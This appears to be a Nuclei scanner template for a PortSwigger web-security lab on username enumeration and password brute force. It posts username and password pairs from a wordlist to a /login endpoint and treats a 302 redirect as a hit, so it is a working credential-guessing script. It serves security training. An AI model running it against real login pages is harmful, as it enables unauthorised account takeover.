id: 2_lab_auth_portswigger_username_password

info:
  name: Username enumeration via subtly different response. Password BruteForce
  author: XI
  severity: high
  description: Username enumeration via subtly different response. Password Cracking
  reference: https://XI
  tags: portswigger, learn, nuclei, auth

http: 
  - raw:
    - |
      POST /login HTTP/2
      Host: {{Host}}
      Content-Type: application/x-www-form-urlencoded

      username={{username}}&password={{password}}

    payloads:
      password: ./passwords.txt

    cookie-reuse: true
    stop-at-first-match: true
    matchers:
      - type: status
        status:
          - 302